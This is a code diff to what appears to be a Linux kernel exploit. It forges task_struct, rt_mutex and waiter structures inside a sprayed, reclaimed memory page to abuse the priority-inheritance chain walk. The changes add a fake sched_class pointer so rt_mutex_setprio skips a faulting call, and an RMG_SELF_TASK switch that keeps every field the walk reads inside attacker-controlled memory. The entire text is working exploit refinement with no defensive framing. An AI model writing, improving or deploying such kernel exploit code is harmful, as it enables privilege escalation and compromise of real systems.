@@ -290,6 +290,14 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
   put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
   put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
+  /* rt_mutex_setprio reads prev_class = task->sched_class and calls
+   * prev_class->switched_from (+0x98) when the priority changes. The spray
+   * buffer is zeroed, so sched_class is NULL there and the walk faults at
+   * 0x98. Point it at a zeroed scratch region of the same reclaimed page:
+   * prev_class->switched_from then reads 0 and the optional call is
+   * skipped. */
+  put64(p, task_off + FAKE_TASK_SCHED_CLASS_OFF,
+        payload_base + SLIDE_BANK_SCHED_CLASS_ZERO_OFF);
   put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
   put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
@@ -785,13 +793,23 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, lock_off + 0x10, waiter);
         put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
 
-        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
-                        lock, SLIDE_FAKE_WAITER_PRIO);
+        uintptr_t trigger_waiter_task = task;
+        if (getenv("RMG_SELF_TASK")) {
+          /* Point waiter->task at the waiter itself: every task_struct
+           * field the PI walk reads then resolves inside this controlled
+           * page instead of the separate fake-task bank. */
+          trigger_waiter_task = waiter;
+        }
+        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target,
+                        trigger_waiter_task, lock, SLIDE_FAKE_WAITER_PRIO);
 
         put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
         put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
         put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
         put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
+        /* Same sched_class guard as put_slide_bank_entry. */
+        put64(p, task_off + FAKE_TASK_SCHED_CLASS_OFF,
+              payload_base + SLIDE_BANK_SCHED_CLASS_ZERO_OFF);
         put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
         put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
               waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
